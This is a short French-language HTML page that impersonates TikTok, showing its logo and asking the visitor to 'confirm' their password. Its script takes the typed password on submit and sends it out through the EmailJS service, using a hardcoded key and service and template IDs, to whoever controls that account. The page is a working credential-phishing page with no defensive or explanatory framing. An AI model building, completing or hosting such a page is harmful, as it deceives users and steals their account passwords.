<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmation du mot de passe</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="form-container">
      <!-- Logo TikTok -->
      <div class="logo-container">
        <img
          src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/tiktok-color-icon.png"
          alt="Logo TikTok"
          class="logo"
        />
      </div>
      <h1>Confirmer votre mot de passe</h1>
      <p class="subtitle">Saisir le mot de passe</p>
      <form id="password-form">
        <div class="input-section">
          <label for="password">Mot de passe :</label>
          <input type="password" id="password" placeholder="" required />
        </div>
        <button type="submit" class="next-button">Suivant</button>
      </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
      (function () {
        emailjs.init("TKsAeYBNJTNWnyUxfM");
      })();

      document
        .getElementById("password-form")
        .addEventListener("submit", function (e) {
          e.preventDefault();
          const password = document.getElementById("password").value;

          emailjs
            .send("service_548dlph", "template_1m2mgz5", {
              user_password: password,
            })
            .then(
              function (response) {
                console.log("Succès:", response);
                alert("Mot de passe envoyé !");
              },
              function (error) {
                console.error("Erreur:", error);
                alert("Échec de l'envoi.");
              }
            );
        });
    </script>
  </body>
</html>
